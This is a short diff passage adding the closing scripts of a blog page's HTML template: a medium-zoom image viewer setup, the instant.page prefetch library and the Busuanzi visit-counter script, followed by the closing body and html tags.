+    mediumZoom(document.querySelectorAll('div.post-body img'), {
+        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
+    })
+</script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>
+
+
+
+
+    
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+
+
+
+
+    </body>
+</html>
